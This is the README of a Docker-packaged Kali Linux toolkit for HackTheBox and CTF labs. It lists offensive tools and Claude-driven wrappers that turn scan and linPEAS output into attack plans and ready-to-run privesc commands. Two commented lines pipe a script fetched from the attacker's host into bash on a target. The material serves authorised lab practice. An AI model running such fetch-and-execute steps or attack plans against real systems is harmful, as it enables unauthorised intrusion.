# kali-htb-docker

A lightweight, persistent Kali Linux environment for HackTheBox and CTF work — built on Docker instead of a VM.

No more waiting for Kali to boot. No more snapshot headaches. Just `make up` and you're hacking.

---

## Why Docker instead of a VM?

| | VM | This |
|---|---|---|
| Boot time | 30–60 sec | ~1 sec |
| RAM usage | 2–4 GB reserved | Only what tools actually use |
| Persistence | Snapshots, shared folders | Mounted host folder |
| Bash history | Lost on rebuild | Survives on host |
| VPN (tun0) | Bridged adapter config | `--network host`, just works |
| Claude Code integration | Awkward | Native — pipe tool output directly |
| Reproducible | "works on my Kali" | `make build` anywhere |

---

## What's included

### Network & Recon
`nmap` `masscan` `netcat` `curl` `wget` `tcpdump` `dnsutils` `whois` `traceroute`

### Web
`gobuster` `ffuf` `nikto` `whatweb` `dirb` `wfuzz` `sqlmap`

### Password Attacks
`hydra` `john` `hashcat`

### Windows / Active Directory
`netexec` (CrackMapExec) `evil-winrm` `smbclient` `smbmap` `ldap-utils` `kerbrute`
`impacket` (psexec, secretsdump, GetNPUsers, ...) `BloodHound-python` `adPEAS` `PowerSploit/PowerView`

### Post-exploitation & Pivoting
`Responder` `chisel` `ligolo-ng` `proxychains4` `socat`

### Linux / Windows PrivEsc
`linPEAS` `winPEAS` `pspy64`

### Exploitation
`pwntools`

### Forensics / Misc
`binwalk` `exiftool` `steghide` `xxd` `tmux` `jq` `p7zip`

### Wordlists
`rockyou.txt` · full `SecLists` collection
Available at `$ROCKYOU`, `$WORDLISTS`, `$SECLISTS`

---

## Requirements

- Docker
- Make
- [Claude Code](https://claude.ai/code) — for AI-assisted recon and analysis (optional but recommended)

---

## Quick Start

```bash
# 1. Clone the repo
git clone https://github.com/your-username/kali-htb-docker
cd kali-htb-docker

# 2. Build the image (~15 min first time)
make build

# 3. Install Claude wrapper scripts (requires Claude Code)
make install-scripts

# 4. Connect OpenVPN on your host
sudo openvpn --config ~/Downloads/your.ovpn

# 5. Start the container
make up
```

You're in. The container sees your `tun0` interface directly — no extra config needed.

---

## Usage

```bash
make up                        # Start a new container
make resume                    # Jump back into a stopped container
make shell                     # Open a second shell in the running container
make stop                      # Pause (work is saved)
make rm                        # Remove container (image and ctfdata folder stay)
make rebuild                   # Rebuild image from scratch (no cache)
make serve                     # HTTP server on :8080 to serve files to targets
```

### Working with machines

```bash
# Create a folder structure for a new machine
make new-machine NAME=Forest

# Set the target IP (shows in your prompt)
make set-target IP=10.10.11.206
```

This creates:
```
ctfdata/
└── Forest/
    ├── scans/
    ├── loot/
    ├── exploit/
    └── notes/
        └── notes.md
```

### Built-in aliases (inside container)

```bash
nmap-quick 10.10.11.x      # Fast open ports scan, saves to /ctfdata/scans/
nmap-full  10.10.11.x      # Full -sC -sV -p- scan
nmap-udp   10.10.11.x      # Top 200 UDP ports
ff http://10.10.11.x/      # ffuf with raft-medium wordlist
```

---

## Claude Code Integration

The most powerful part of this setup. Because the container uses `--network host` and shares `ctfdata/` with the host, Claude Code can interact with your hacking session directly.

### Install wrapper scripts

```bash
make install-scripts
```

This copies 5 scripts to `/usr/local/bin`:

### `ai-recon` — full recon pipeline in one command

```bash
make ai-recon IP=10.10.11.206 NAME=Forest
# or directly:
ai-recon 10.10.11.206 Forest
```

Runs a full port scan → service scan on open ports → whatweb if HTTP detected → Claude writes a structured attack plan and saves it to `ctfdata/notes/Forest-recon.md`.

### `nmap-claude` — scan + instant analysis

```bash
nmap-claude 10.10.11.206
nmap-claude 10.10.11.206 -p 80,443,8080   # specific ports
```

Runs nmap inside the container, Claude identifies the most interesting services and gives you prioritized next steps.

### `gobuster-claude` — dir bruteforce + analysis

```bash
gobuster-claude http://10.10.11.206
gobuster-claude http://10.10.11.206/api /usr/share/seclists/Discovery/Web-Content/api.txt
```

Runs gobuster with common extensions, Claude flags interesting paths and suggests follow-up enumeration.

### `linpeas-claude` — privesc analysis

```bash
# First, get linpeas output on the target:
# curl http://YOUR_IP:8080/linpeas.sh | bash > /tmp/linpeas.txt
# Then copy it back and analyze:
linpeas-claude ctfdata/loot/linpeas.txt
```

Filters out the noise from linpeas output and gives you the top 3 privesc paths with ready-to-run commands.

### `hash-claude` — hash identification + cracking commands

```bash
hash-claude '5f4dcc3b5aa765d61d8327deb882cf99'
cat ctfdata/loot/hashes.txt | hash-claude
```

Identifies the hash type and gives you the exact hashcat `-m` mode and john command, copy-paste ready.

### Typical AI-assisted session

```bash
# Start
make up
make set-target IP=10.10.11.206

# Full recon in one command
make ai-recon IP=10.10.11.206 NAME=Forest

# Web enum
gobuster-claude http://10.10.11.206

# Found a hash
hash-claude '$6$rounds=656000$tYtUSQ4r$...'

# Got a shell, ran linpeas
make serve   # serve files from ctfdata/ on :8080
# on target: curl http://YOUR_IP:8080/linpeas.sh | bash > /tmp/out.txt
# copy back, then:
linpeas-claude ctfdata/loot/linpeas.txt
```

---

## Persistence

Everything important lives in `./ctfdata/` on your **host machine** — not inside the container:

```
your-writeups/
├── Dockerfile
├── Makefile
├── scripts/                  ← Claude wrapper scripts
├── ctfdata/                  ← mounted as /ctfdata inside the container
│   ├── .bash_history         ← shell history survives rebuilds
│   ├── .target               ← current target IP
│   ├── scans/
│   ├── loot/
│   ├── exploit/
│   ├── notes/                ← ai-recon saves summaries here
│   └── vpn/                  ← put your .ovpn files here
├── Forest/                   ← your writeups live alongside
└── Active/
```

Rebuild the image, your history, scans, loot and AI-generated notes are all still there.

---

## Customization

To add or remove tools, edit `Dockerfile` and rebuild:

```bash
vim Dockerfile   # add apt install / pip install / git clone
make rebuild
```

The image name, container name and workdir can be changed at the top of `Makefile`:

```makefile
IMAGE     := kali-htb
CONTAINER := htb-box
WORKDIR   := $(PWD)/ctfdata
```

---

## License

MIT — use it, fork it, adapt it to your own toolkit.

---

## TODO

### Tools & wordlists
- [ ] Add `rustscan` as a faster nmap pre-scanner
- [ ] Add `feroxbuster` as an alternative to gobuster/ffuf
- [ ] Add `nuclei` + templates for vulnerability scanning
- [ ] Add `subfinder` + `amass` for subdomain enumeration
- [ ] Add `enum4linux-ng` (rewrite of enum4linux, better output)
- [ ] Add `certipy` for AD CS (certificate services) attacks
- [ ] Add `coercer` for NTLM coercion attacks
- [ ] Add `pypykatz` as a Python alternative to mimikatz
- [ ] Add pre-downloaded `PayloadsAllTheThings` cheatsheets to `/opt`
- [ ] Pin SecLists to a specific release tag for reproducibility

### Shell & UX
- [ ] Add `fzf` for fuzzy history search (Ctrl+R)
- [ ] Add `zsh` + `oh-my-zsh` as an optional alternative to bash
- [ ] Add `bat` (better `cat`) and `fd` (better `find`)
- [ ] Add a `make notes` target that opens notes.md for current machine in vim

### Workflow
- [ ] `make vpn` — auto-detect `.ovpn` file in `ctfdata/vpn/` if only one exists
- [ ] `make update` — pull latest versions of git-cloned tools (Responder, adPEAS, etc.)
- [ ] `make clean-scans` — archive old scans for a machine instead of deleting
- [ ] Add a `docker-compose.yml` as an alternative to the Makefile

### Claude Code integration
- [x] `nmap-claude` — scan and analyze with Claude
- [x] `gobuster-claude` — dir bruteforce and analyze with Claude
- [x] `linpeas-claude` — privesc analysis with Claude
- [x] `hash-claude` — hash identification and cracking commands
- [x] `ai-recon` — full recon pipeline with Claude summary
- [ ] `bloodhound-claude` — analyze BloodHound JSON output for AD attack paths
- [ ] `make ai-recon` — add automatic screenshot of Claude output to notes

### CI / Maintenance
- [x] GitHub Actions workflow to build and push image to GHCR on every commit
- [x] Weekly scheduled build to pull latest Kali packages
- [ ] Add a `make check` target that verifies all key tools are present after build